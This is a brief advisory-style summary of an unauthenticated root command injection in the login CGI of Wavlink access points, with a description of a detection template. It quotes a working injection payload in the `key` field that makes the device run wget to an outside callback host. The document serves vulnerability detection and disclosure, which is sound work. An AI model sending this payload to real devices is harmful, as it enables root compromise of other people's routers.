## Vulnerability

Wavlink Multiple AP devices are vulnerable to remote command injection (CWE-77) allowing unauthenticated remote users to execute arbitrary commands as root. Unsanitized user input in the `key` parameter of the login request to `/cgi-bin/login.cgi`. Tested on WN575A4 and WN579X3 models; other Wavlink products may also be affected. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). Successful exploitation enables unauthorized access, data leakage, and full device compromise. Mitigate with latest vendor firmware.

## PoC / Detection

Classification: rce

The template sends a single raw POST request to `/cgi-bin/login.cgi` embedding the payload `';`wget http://{{interactsh-url}};`;#` inside the `key` form field (alongside dummy `admin`/`asd` credentials). Detection succeeds if an HTTP interactsh callback is received, the response body contains `parent.location.replace`, and HTTP status is 200.
